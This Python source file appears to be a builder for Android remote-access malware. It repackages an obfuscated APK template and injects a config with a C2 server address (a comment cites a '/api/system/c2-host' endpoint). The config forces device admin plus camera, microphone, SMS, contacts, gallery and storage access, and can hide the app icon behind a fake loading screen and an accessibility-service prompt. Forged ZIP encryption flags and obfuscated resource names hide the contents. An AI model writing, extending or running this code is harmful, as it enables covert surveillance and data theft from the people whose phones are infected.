#!/usr/bin/env python3
"""Free APK template adapter.

Stage 1 deliberately preserves the signed template byte-for-byte.  Configuration
and resource injection will be added only after the template can be built and
installed independently from the original ZM26 templates.
"""

from __future__ import annotations

import hashlib
import json
import os
import shutil
import struct
import tempfile
import zipfile
from typing import Any
from urllib.parse import urlsplit, urlunsplit


class FreeTemplateBuilder:
    template_type = "free"
    protocol_version = "free-v1"
    logical_assets = {
        "server_config.json": "assets/0.bt",
        "app_config.json": "assets/1.bt",
        "locateValues.json": "assets/2.bt",
        "monitor_config.json": "assets/3.bt",
    }
    # Free's manifest points at these obfuscated raster resources through the
    # mipmap/test and mipmap/test_round aliases.  The adaptive XML aliases use
    # the corresponding foreground layers on Android 8+.
    icon_resource_paths = {
        "Be4/S᷎̞ᷕuX/͋WJ.png", "MSx/ᪿ᷂ᷨ̄/͎͢i4J.png",
        "᷉/̞᪳᫣CrY/̲᷃3ᷣZ.png", "᫈/mᷗ7᪵fNW/̟᷁ᷙḡ̻.png",
        "᷃/͂᫈c̶ᷭ/̞ͣ.png", "ͣI/̯᪺᫇bmd/᫊rBXu.png",
        "D̊/̖̔ᷦ᷅1/vka᫁̃Vv.png", "Wqd/̊᪼3̬̀D/5᫺ᷟuJj̨w.png",
        "᫧/᷐᫋᫋kkA/ᷞT.png", "̓d/̨ᷞn᪱MGp/lᷟᷕ.png",
        "̰W/ͪd̮᫫᫴Z/kᷪᷟ͞U.png", "T͔/̑H᪶Hu᪳q/x͇̱ᷮᷟͅ.png",
        "͏G/᷄PA᫪s̈́̃/᷄M.png", "ͫl/̭͚᫂̑v͇2/᫑᷐b.png",
        "ᷯ/Ṵ᷿᷵᫡S/̱̲᷏᷻.png", "SHK/3w᪹̙᫪᫰/ᷤao᫮᷏9s.png",
        "zeq/r᫣̪ᷰs᪱t/uᷱ.png", "᫂/᪵r᫆̽T̥͆/᷹᷾I.png",
        "᫳/AF᪸᷌᫲ᷡ/ͤṖᷙNZ.png", "᪼/᫿͙l̥Z͕x5f/̹ᷳRᷤbmNQ.png",
    }

    def __init__(self, template_path: str):
        self.template_path = os.path.abspath(template_path)
        if not os.path.isfile(self.template_path):
            raise FileNotFoundError(f"Free APK template not found: {self.template_path}")

    def inspect(self) -> dict[str, Any]:
        """Return stable facts without attempting to decode protected entries."""
        with open(self.template_path, "rb") as source:
            digest = hashlib.sha256(source.read()).hexdigest()
        with zipfile.ZipFile(self.template_path, "r") as archive:
            names = set(archive.namelist())
            dex_count = sum(1 for name in names if name == "classes.dex" or
                            (name.startswith("classes") and name.endswith(".dex")))
            native_count = sum(1 for name in names if name.startswith("lib/") and name.endswith(".so"))
            assets = sorted(name for name in names if name.startswith("assets/"))
            protected_assets = []
            for logical_name, encrypted_name in self.logical_assets.items():
                if encrypted_name not in names:
                    continue
                info = archive.getinfo(encrypted_name)
                payload = self._read_raw_entry(source_path=self.template_path, info=info)
                protected_assets.append({
                    "logicalName": logical_name,
                    "encryptedName": encrypted_name,
                    "magic": payload[:4].decode("ascii", errors="replace"),
                    "headerSize": 36 if payload[:4] == b"ZM27" else 20 if payload[:4] == b"ZM26" else 0,
                    "headerHex": payload[:36].hex(),
                    "payloadSize": max(0, len(payload) - (36 if payload[:4] == b"ZM27" else 20 if payload[:4] == b"ZM26" else 0)),
                    "zipMethod": info.compress_type,
                    "zipFlags": info.flag_bits,
                })
        return {
            "templateType": self.template_type,
            "protocolVersion": self.protocol_version,
            "sha256": digest,
            "size": os.path.getsize(self.template_path),
            "dexCount": dex_count,
            "nativeLibraryCount": native_count,
            "hasManifest": "AndroidManifest.xml" in names,
            "hasResources": "resources.arsc" in names,
            "assetCount": len(assets),
            "assets": assets,
            "protectedAssets": protected_assets,
        }

    @staticmethod
    def _read_raw_entry(source_path: str, info: zipfile.ZipInfo) -> bytes:
        """Read a forged-encryption ZIP entry without asking zipfile to decrypt it."""
        raw = open(source_path, "rb").read()
        filename_size, extra_size = struct.unpack_from("<HH", raw, info.header_offset + 26)
        start = info.header_offset + 30 + filename_size + extra_size
        data = raw[start:start + info.compress_size]
        if info.compress_type == zipfile.ZIP_DEFLATED:
            import zlib
            return zlib.decompress(data, -15)
        return data

    def build_raw(self, output_path: str) -> dict[str, Any]:
        """Create a byte-identical build artifact and write a sidecar summary."""
        output_path = os.path.abspath(output_path)
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        if os.path.abspath(self.template_path) != output_path:
            shutil.copy2(self.template_path, output_path)
        summary = self.inspect()
        summary["output"] = output_path
        with open(output_path, "rb") as output:
            summary["outputSha256"] = hashlib.sha256(output.read()).hexdigest()
        summary["byteIdentical"] = summary["sha256"] == summary["outputSha256"]
        with open(output_path + ".template.json", "w", encoding="utf-8") as sidecar:
            json.dump(summary, sidecar, ensure_ascii=False, indent=2)
        if not summary["byteIdentical"]:
            raise ValueError("Free 原样构建产物与模板字节不一致")
        print(f"Free template: {summary['sha256']}")
        print(f"Free raw build: {output_path}")
        return summary

    def build_configured(
        self,
        output_path: str,
        server_url: str,
        web_url: str,
        config: dict[str, Any],
        bg_path: str = "",
        icon_path: str = "",
        signer=None,
    ) -> dict[str, Any]:
        """Build a Free APK with a runtime configuration override asset.

        The original ZM27 entries remain untouched.  The patched Java call sites
        read this asset first and fall back to the native reader when it is absent.
        """
        base_path = os.path.join(os.path.dirname(self.template_path), "source_free_override_base.apk")
        if not os.path.isfile(base_path):
            raise FileNotFoundError(
                "Free 配置覆盖基础包不存在，请先构建 extend/source_free_override_base.apk"
            )

        psc = config if isinstance(config, dict) else {}
        # 使用构建页面提交的地址；该地址可由 /api/system/c2-host 自动生成。
        server_url = str(server_url or "").strip().rstrip("/")
        if not server_url:
            raise ValueError("服务器地址不能为空")
        web_url = str(web_url or "").strip().rstrip("/")
        def as_bool(key: str, default: bool) -> bool:
            value = psc.get(key, default)
            return value is True or str(value).lower() in ("1", "true", "yes", "on")

        web = web_url or self._web_url_from_server(server_url)
        server_config = {
            "serverUrl": server_url,
            "webUrl": web,
            "ownerUsername": psc.get("_ownerUsername", ""),
            "enableServiceMode": as_bool("_enableServiceMode", True),
            "enableConfigMask": as_bool("_enableConfigMask", True),
            "enableProgressBar": as_bool("_enableProgressBar", False),
            "enableDeviceAdmin": True,
            "enableNotificationListener": False,
            "enableCamera": True,
            "enableContacts": True,
            "enableGallery": True,
            "enableMicrophone": True,
            "enableSms": True,
            "enableStorage": True,
            "showAppIcon": as_bool("_showAppIcon", True),
            "uninstallMode": as_bool("_uninstallMode", False),
            "configMaskText": psc.get("_configMaskText", ""),
            "configMaskSubtitle": psc.get("_configMaskSubtitle", ""),
            "configMaskTextColor": psc.get("_configMaskTextColor", "#FFFFFF"),
            "configMaskSubtitleColor": psc.get("_configMaskSubtitleColor", "#CCCCCC"),
            "loadingTips": self._loading_tips(psc.get("_loadingTips", "")),
            "pageStyleConfig": {
                "appName": psc.get("appName", "Kiss Free"),
                "applicationId": "com.stone.star.soft",
                "versionName": psc.get("versionName", "5.2.1"),
                "statusText": psc.get("statusText", ""),
                "enableButtonText": psc.get("enableButtonText", "开启辅助功能"),
                "usageInstructions": psc.get("usageInstructions", ""),
                "enableServiceTitle": psc.get("enableServiceTitle", "启用无障碍服务"),
                "enableServiceSubtitle": psc.get("enableServiceSubtitle", "为确保应用正常运行，请允许以下权限"),
                "buttonColor": psc.get("buttonColor", "#4F8CFF"),
            },
        }
        override = json.dumps(server_config, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
        runtime_classes_path = os.path.join(
            os.path.dirname(self.template_path), "free_runtime_url_classes.dex"
        )
        if not os.path.isfile(runtime_classes_path):
            raise FileNotFoundError(
                "Free runtime URL patch DEX missing: extend/free_runtime_url_classes.dex"
            )
        with open(runtime_classes_path, "rb") as runtime_classes_file:
            runtime_classes = runtime_classes_file.read()
        output_path = os.path.abspath(output_path)
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        app_name = str(server_config["pageStyleConfig"]["appName"] or "Kiss Free")
        version_name = str(server_config["pageStyleConfig"]["versionName"] or "5.2.1")
        with tempfile.NamedTemporaryFile(prefix="free-build-", suffix=".apk", delete=False, dir=os.path.dirname(output_path)) as tmp:
            temp_path = tmp.name
        try:
            with zipfile.ZipFile(base_path, "r") as zin, zipfile.ZipFile(temp_path, "w", allowZip64=True) as zout:
                written_names = set()
                for info in zin.infolist():
                    data = zin.read(info.filename)
                    if info.filename == "classes.dex":
                        data = runtime_classes
                    if info.filename == "resources.arsc" and app_name != "Kiss Free":
                        data = self._replace_table_string(data, "Kiss Free", app_name)
                    if info.filename == "AndroidManifest.xml" and version_name != "5.2.1":
                        data = self._replace_table_string(data, "5.2.1", version_name)
                    if info.filename == "assets/app_loading_bg.png" and bg_path and os.path.isfile(bg_path):
                        data = open(bg_path, "rb").read()
                    out_info = zipfile.ZipInfo(info.filename)
                    out_info.date_time = info.date_time
                    out_info.compress_type = info.compress_type
                    out_info.external_attr = info.external_attr
                    zout.writestr(out_info, data)
                    written_names.add(info.filename)

                # apktool recompiles the manifest/resources and DEX files, but it
                # omits Free's obfuscated resource payloads.  resources.arsc still
                # points at those paths, so copy every missing entry from the
                # original template.  The template uses forged encryption flags;
                # _read_raw_entry returns the real uncompressed payload.
                with zipfile.ZipFile(self.template_path, "r") as original:
                    for original_info in original.infolist():
                        name = original_info.filename
                        if name in written_names or name.upper().startswith("META-INF/"):
                            continue
                        data = self._read_raw_entry(self.template_path, original_info)
                        if (icon_path and os.path.isfile(icon_path) and
                                name in self.icon_resource_paths):
                            data = open(icon_path, "rb").read()
                        restored_info = zipfile.ZipInfo(name)
                        restored_info.date_time = original_info.date_time
                        restored_info.compress_type = original_info.compress_type
                        restored_info.external_attr = original_info.external_attr
                        zout.writestr(restored_info, data)
                        written_names.add(name)
                override_info = zipfile.ZipInfo("assets/free_override/server_config.json")
                override_info.compress_type = zipfile.ZIP_DEFLATED
                zout.writestr(override_info, override)
                if icon_path and os.path.isfile(icon_path):
                    icon_info = zipfile.ZipInfo("assets/free_override/app_icon.png")
                    icon_info.compress_type = zipfile.ZIP_STORED
                    with open(icon_path, "rb") as icon_file:
                        zout.writestr(icon_info, icon_file.read())
            if signer:
                if not signer(temp_path, output_path):
                    raise RuntimeError("Free 配置包签名失败")
            else:
                shutil.copy2(temp_path, output_path)
        finally:
            if os.path.exists(temp_path):
                os.remove(temp_path)

        summary = self.inspect()
        summary.update({
            "output": output_path,
            "byteIdentical": False,
            "overrideAsset": "assets/free_override/server_config.json",
            "effectiveServerUrl": server_url,
            "effectiveWebUrl": web,
            "effectiveAppName": server_config["pageStyleConfig"]["appName"],
            "effectivePackageName": "com.stone.star.soft",
        })
        with open(output_path, "rb") as output:
            summary["outputSha256"] = hashlib.sha256(output.read()).hexdigest()
        with open(output_path + ".template.json", "w", encoding="utf-8") as sidecar:
            json.dump(summary, sidecar, ensure_ascii=False, indent=2)
        print(f"Free configured build: {output_path}")
        return summary

    @classmethod
    def _replace_table_string(cls, blob: bytes, old: str, new: str) -> bytes:
        """Replace a value in the first Android binary string pool."""
        if len(blob) < 8:
            raise ValueError("Android resource blob is truncated")
        _, header_size, declared_size = struct.unpack_from("<HHI", blob, 0)
        if declared_size > len(blob) or header_size < 8:
            raise ValueError("Android resource header is invalid")

        offset = header_size
        while offset + 8 <= declared_size:
            chunk_type, _, chunk_size = struct.unpack_from("<HHI", blob, offset)
            if chunk_size < 8 or offset + chunk_size > declared_size:
                raise ValueError("Android resource child chunk is invalid")
            if chunk_type == 0x0001:
                original = blob[offset:offset + chunk_size]
                replacement = cls._replace_string_pool_value(original, old, new)
                result = bytearray(blob[:offset] + replacement + blob[offset + chunk_size:])
                struct.pack_into("<I", result, 4, len(result))
                return bytes(result)
            offset += chunk_size
        raise ValueError("Android resource string pool was not found")

    @classmethod
    def _replace_string_pool_value(cls, chunk: bytes, old: str, new: str) -> bytes:
        chunk_type, header_size, chunk_size = struct.unpack_from("<HHI", chunk, 0)
        if chunk_type != 0x0001 or header_size < 28 or chunk_size != len(chunk):
            raise ValueError("Android string pool header is invalid")
        string_count, style_count, flags, strings_start, styles_start = struct.unpack_from(
            "<5I", chunk, 8
        )
        if style_count or styles_start:
            raise ValueError("Styled Android string pools are not supported")
        if strings_start < header_size + string_count * 4 or strings_start > chunk_size:
            raise ValueError("Android string pool offsets are invalid")

        utf8 = bool(flags & 0x00000100)
        source_offsets = list(struct.unpack_from(f"<{string_count}I", chunk, header_size))
        encoded_strings: list[bytes] = []
        replaced = 0
        for relative_offset in source_offsets:
            start = strings_start + relative_offset
            value, end = cls._decode_pool_string(chunk, start, utf8)
            if value == old:
                encoded_strings.append(cls._encode_pool_string(new, utf8))
                replaced += 1
            else:
                encoded_strings.append(chunk[start:end])
        if not replaced:
            raise ValueError(f"Android string pool value was not found: {old}")

        rebuilt_data = bytearray()
        rebuilt_offsets = []
        for encoded in encoded_strings:
            rebuilt_offsets.append(len(rebuilt_data))
            rebuilt_data.extend(encoded)
        while (strings_start + len(rebuilt_data)) % 4:
            rebuilt_data.append(0)

        result = bytearray(chunk[:strings_start])
        struct.pack_into(f"<{string_count}I", result, header_size, *rebuilt_offsets)
        result[strings_start:] = rebuilt_data
        struct.pack_into("<I", result, 4, len(result))
        return bytes(result)

    @classmethod
    def _decode_pool_string(cls, data: bytes, offset: int, utf8: bool) -> tuple[str, int]:
        if utf8:
            _, offset = cls._decode_length8(data, offset)
            byte_length, offset = cls._decode_length8(data, offset)
            end = offset + byte_length
            if end >= len(data) or data[end] != 0:
                raise ValueError("UTF-8 Android string is truncated")
            return data[offset:end].decode("utf-8"), end + 1

        utf16_length, offset = cls._decode_length16(data, offset)
        end = offset + utf16_length * 2
        if end + 1 >= len(data) or data[end:end + 2] != b"\x00\x00":
            raise ValueError("UTF-16 Android string is truncated")
        return data[offset:end].decode("utf-16le"), end + 2

    @staticmethod
    def _decode_length8(data: bytes, offset: int) -> tuple[int, int]:
        first = data[offset]
        if first & 0x80:
            return ((first & 0x7F) << 8) | data[offset + 1], offset + 2
        return first, offset + 1

    @staticmethod
    def _decode_length16(data: bytes, offset: int) -> tuple[int, int]:
        first = struct.unpack_from("<H", data, offset)[0]
        if first & 0x8000:
            second = struct.unpack_from("<H", data, offset + 2)[0]
            return ((first & 0x7FFF) << 16) | second, offset + 4
        return first, offset + 2

    @classmethod
    def _encode_pool_string(cls, value: str, utf8: bool) -> bytes:
        utf16 = value.encode("utf-16le")
        utf16_length = len(utf16) // 2
        if utf8:
            encoded = value.encode("utf-8")
            return (
                cls._encode_length8(utf16_length)
                + cls._encode_length8(len(encoded))
                + encoded
                + b"\x00"
            )
        return cls._encode_length16(utf16_length) + utf16 + b"\x00\x00"

    @staticmethod
    def _encode_length8(value: int) -> bytes:
        if value > 0x7FFF:
            raise ValueError("UTF-8 Android string is too long")
        if value > 0x7F:
            return bytes(((value >> 8) | 0x80, value & 0xFF))
        return bytes((value,))

    @staticmethod
    def _encode_length16(value: int) -> bytes:
        if value > 0x7FFFFFFF:
            raise ValueError("UTF-16 Android string is too long")
        if value > 0x7FFF:
            return struct.pack("<HH", (value >> 16) | 0x8000, value & 0xFFFF)
        return struct.pack("<H", value)

    @staticmethod
    def _web_url_from_server(server_url: str) -> str:
        """Derive the HTTP endpoint from the configured WS endpoint."""
        parts = urlsplit(str(server_url).strip())
        scheme = {"ws": "http", "wss": "https"}.get(parts.scheme.lower(), parts.scheme)
        path = parts.path.rstrip("/")
        if path == "/ws":
            path = ""
        return urlunsplit((scheme, parts.netloc, path, parts.query, parts.fragment)).rstrip("/")

    @staticmethod
    def _loading_tips(value: Any) -> list[str]:
        if isinstance(value, list):
            return [str(item) for item in value if str(item)]
        if isinstance(value, str) and value:
            try:
                parsed = json.loads(value)
                if isinstance(parsed, list):
                    return [str(item) for item in parsed if str(item)]
            except Exception:
                pass
            return [line for line in value.splitlines() if line]
        return ["Connecting...", "Initializing...", "Loading resources...", "Almost ready...", "Starting..."]
